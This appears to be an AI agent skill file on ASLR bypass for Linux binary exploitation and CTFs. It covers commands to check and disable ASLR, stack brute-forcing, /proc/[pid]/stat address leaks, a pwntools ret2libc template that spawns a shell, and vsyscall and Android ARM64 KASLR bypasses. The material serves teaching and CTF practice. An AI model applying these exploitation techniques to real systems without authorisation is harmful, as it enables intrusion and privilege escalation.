---
name: aslr-bypass
description: How to check, disable, and bypass ASLR (Address Space Layout Randomization) on Linux systems. Use this skill whenever the user mentions ASLR, address randomization, memory layout, binary exploitation, CTF challenges involving memory addresses, or needs to work around ASLR for debugging or exploitation. This includes checking ASLR status, disabling it for testing, brute-forcing addresses, using information leaks, or exploiting fixed addresses like vsyscall/vDSO.
---

# ASLR Bypass Techniques

**Address Space Layout Randomization (ASLR)** randomizes memory addresses used by processes to make exploitation harder. This skill covers checking ASLR status, disabling it for testing, and various bypass techniques.

## Quick Reference

| Task | Command |
|------|--------|
| Check ASLR status | `cat /proc/sys/kernel/randomize_va_space` |
| Disable ASLR (temp) | `echo 0 \| sudo tee /proc/sys/kernel/randomize_va_space` |
| Enable ASLR (full) | `echo 2 \| sudo tee /proc/sys/kernel/randomize_va_space` |
| Disable for one run | `setarch \`arch\` -R ./binary` |

## Understanding ASLR Values

- **0**: No randomization (everything static)
- **1**: Conservative (libraries, stack, mmap, VDSO randomized)
- **2**: Full (plus brk() memory randomized)

## Bypass Techniques

### 1. Brute-Force (32-bit)

On 32-bit systems, entropy is limited:
- **Stack**: ~11 bits effective (524,288 possible addresses)
- **Code/data**: 16 bits
- **mmap/libraries**: 16 bits

**Approaches:**
- Use large NOP sleds and retry until execution lands on them
- Add shellcode in environment variables for local exploits
- Brute-force libc base addresses
- For remote servers: time-based detection (e.g., `usleep(10)` causes 10s delay when hit)

**Use the script:** `scripts/brute_force_stack.py` for automated stack brute-forcing

### 2. Brute-Force (64-bit)

64-bit has much higher entropy, but you can:
- Fill stack with environment variables
- Retry hundreds/thousands of times locally
- Target specific stack addresses that occasionally contain NOPs

**Use the script:** `scripts/brute_force_stack.py` with appropriate architecture settings

### 3. Information from `/proc/[pid]/stat`

When you have local access to the target machine, `/proc/[pid]/stat` reveals:
- `startcode`/`endcode`: TEXT segment boundaries
- `startstack`: Stack start address
- `start_data`/`end_data`: BSS boundaries
- `kstkesp`/`kstkeip`: Current ESP/EIP
- `arg_start`/`arg_end`: Command line arguments
- `env_start`/`env_end`: Environment variables

**Use the script:** `scripts/read_proc_stat.py` to parse and extract addresses

### 4. Using Information Leaks

If the challenge provides a leak:

**Given libc leak:**
```python
from pwn import *

elf = context.binary = ELF('./vuln')
libc = elf.libc
p = process()

# Receive leak
p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

# Calculate libc base
libc.address = system_leak - libc.sym['system']

# Build payload
payload = flat(
    'A' * offset,
    libc.sym['system'],
    0x0,
    next(libc.search(b'/bin/sh'))
)

p.sendline(payload)
p.interactive()
```

**ret2plt leak:** Use buffer overflow to call a function and leak its GOT entry address

**Format string leak:** Use format string vulnerability to read GOT entries

### 5. Fixed Addresses (No Leak Needed)

#### vsyscall

The `vsyscall` page has a **fixed address** not subject to ASLR:
- **Address**: `0xffffffffff600000` (x86_64)
- Contains syscall stubs and a `ret` instruction
- Can be used in ROP chains without leaking

Example gadget at `0xffffffffff600809`: `ret` instruction

#### vDSO

The `vDSO` (virtual dynamic shared object) may have predictable addresses depending on kernel configuration:
- Check if kernel has `CONFIG_COMPAT_VDSO`
- Address may not be randomized in some configurations

#### KASLR on ARM64 (Android)

On many ARM64 Android kernels, the **linear map base is fixed**:

```
PAGE_OFFSET = 0xffffff8000000000
PHYS_OFFSET = memstart_addr (from /proc/kallsyms)
Translation: virt = ((phys - PHYS_OFFSET) | PAGE_OFFSET)
```

**Exploitation:**
1. `grep memstart /proc/kallsyms` to find `memstart_addr`
2. Read 8 bytes at that address (little-endian) to get `PHYS_OFFSET`
3. Calculate virtual addresses: `virt = ((phys - PHYS_OFFSET) | 0xffffff8000000000)`

This breaks KASLR for targets reachable via the direct map.

## Scripts

### Check ASLR Status
```bash
./scripts/check_aslr.sh
```

### Toggle ASLR
```bash
./scripts/toggle_aslr.sh enable   # Set to 2 (full)
./scripts/toggle_aslr.sh disable  # Set to 0 (off)
```

### Brute-Force Stack
```bash
./scripts/brute_force_stack.py ./binary --arch x86_64 --max-attempts 10000
```

### Parse Process Stat
```bash
./scripts/read_proc_stat.py <pid>
```

## When to Use Each Technique

| Scenario | Recommended Approach |
|----------|---------------------|
| Local testing/debugging | Disable ASLR temporarily |
| 32-bit binary, local | Brute-force with NOP sled |
| 32-bit binary, remote | Time-based detection (usleep) |
| 64-bit binary, local | Brute-force with env vars |
| Have info leak | Calculate offsets from leak |
| No leak, x86_64 | Use vsyscall fixed addresses |
| Android ARM64 | Exploit fixed linear map |
| Local access to target | Read /proc/[pid]/stat |

## Important Notes

- **64-bit brute-forcing is impractical** for remote targets due to high entropy
- **Always test locally first** before attempting remote exploitation
- **ASLR changes are temporary** unless written to `/etc/sysctl.conf`
- **vsyscall/vDSO addresses vary** by architecture and kernel version
- **KASLR bypass on Android** requires kernel read primitive or root

## References

- [Defeating KASLR by Doing Nothing at All (Project Zero)](https://googleprojectzero.blogspot.com/2025/11/defeating-kaslr-by-doing-nothing-at-all.html)
- [man7.org /proc/pid/stat](https://man7.org/linux/man-pages/man5/proc.5.html)
- [ARM64 linear map randomization removal](https://git.kernel.org/pub/scm/linux/kernel/git/arm64/linux.git/commit/?id=1db780bafa4c)
